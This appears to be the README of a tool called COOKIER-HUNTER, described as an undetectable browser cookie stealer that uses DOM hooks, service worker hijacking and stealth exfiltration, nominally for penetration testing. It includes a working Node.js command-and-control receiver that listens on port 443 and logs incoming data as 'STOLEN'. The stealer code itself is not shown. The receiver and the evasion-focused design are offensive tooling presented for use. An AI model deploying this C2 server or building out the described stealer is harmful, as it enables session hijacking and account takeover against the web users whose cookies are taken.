# COOKIER-HUNTER
 A highly advanced, undetectable cookie stealer designed for penetration testing. This implementation uses multiple evasion techniques including DOM manipulation hooks, service worker hijacking, and stealth exfiltration.

# C2 Server Requirements:

 # Simple Node.js C2 receiver
node -e "
const http = require('http');
http.createServer((req, res) => {
    let data = '';
    req.on('data', chunk => data += chunk);
    req.on('end', () => {
        console.log('STOLEN:', data);
        res.end('OK');
    });
}).listen(443);
"

